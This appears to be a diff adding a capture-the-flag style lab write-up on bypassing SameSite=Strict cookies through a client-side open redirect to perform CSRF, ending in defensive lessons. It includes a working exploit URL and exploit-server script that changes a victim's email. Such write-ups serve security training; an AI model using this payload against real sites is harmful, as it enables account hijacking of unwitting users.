@@ -1,0 +1,80 @@
+================================
+LAB: SameSite Strict bypass via client-side redirect
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 10, 2026
+Lab URL: https://0adb00e004e16a6782ad9cc200fd009c.web-security-academy.net
+Category: CSRF / SameSite Bypass
+Level: Practitioner
+Objective: Exploit CSRF to change victim's email address despite SameSite=Strict protection
+Description: Change email function vulnerable to CSRF. SameSite=Strict cookie must be bypassed using client-side redirect vulnerability.
+
+[RECONNAISSANCE]
+----------------
+- Logged in as wiener:peter
+- Intercepted POST request to /my-account/change-email:
+  * Parameters: email, submit
+  * Session cookie present with SameSite=Strict attribute
+- Confirmed via Set-Cookie header on /login response:
+  Set-Cookie: session=...; Secure; HttpOnly; SameSite=Strict
+- Tested GET method on /my-account/change-email endpoint:
+  * GET request with URL parameters accepted
+  * Email successfully changed via GET
+- Explored site functionality, found comment confirmation page:
+  * URL: /post/comment/confirmation?postId=9
+  * Loads external JavaScript: /resources/js/commentConfirmationRedirect.js
+- Analyzed JavaScript source code:
+  * Function redirectOnConfirmation() performs client-side redirect after 3 seconds
+  * Extracts postId parameter from URL without validation
+  * Constructs redirect: window.location = blogPath + '/' + postId
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Client-side open redirect in /post/comment/confirmation endpoint:
+- postId parameter directly concatenated into window.location without sanitization
+- Path traversal possible via ../../ sequences
+- JavaScript redirect treated as same-site navigation by browser
+- SameSite=Strict cookies included in JavaScript-initiated navigation from same-site page
+
+Key weakness: SameSite=Strict prevents cross-site cookie transmission but NOT when:
+1. User navigates to legitimate domain (top-level navigation)
+2. JavaScript on that domain redirects internally (client-side = same-site context)
+
+[EXPLOITATION]
+--------------
+Payload construction:
+- Target: /my-account/change-email?email=hacker@evil.com&submit=1
+- Traversal: ../../my-account/change-email from /post/ directory
+- URL encoding: & encoded as %26 to keep entire payload within postId parameter
+
+Final malicious URL:
+https://0adb00e004e16a6782ad9cc200fd009c.web-security-academy.net/post/comment/confirmation?postId=../../my-account/change-email?email=hacker@evil.com%26submit=1
+
+Exploit server payload:
+<script>
+    window.location = 'https://0adb00e004e16a6782ad9cc200fd009c.web-security-academy.net/post/comment/confirmation?postId=../../my-account/change-email?email=hacker@evil.com%26submit=1';
+</script>
+
+Attack flow:
+1. Victim clicks exploit server link (cross-site)
+2. Redirect to /post/comment/confirmation on legitimate domain (top-level navigation, cookie included)
+3. Page loads JavaScript, waits 3 seconds
+4. window.location executes client-side redirect (same-site context, cookie included)
+5. GET /my-account/change-email?email=hacker@evil.com&submit=1 with victim's session
+6. Email changed
+
+[EVIDENCE]
+----------
+- Manual test successful: email changed when logged in as wiener
+- Delivered exploit to victim via exploit server
+- Lab solved: victim's email successfully changed
+
+[LESSONS LEARNED]
+-----------------
+- SameSite=Strict only protects against cross-site requests, not same-site navigations
+- Client-side redirects (JavaScript) maintain same-site context even if initiated from external source
+- Top-level navigation to legitimate domain allows cookies, subsequent JS redirects preserve context
+- Always validate and sanitize URL parameters used in redirects (whitelist approach)
+- Defense: validate redirect destinations, use allowlist of safe paths, avoid concatenating user input into navigation targets
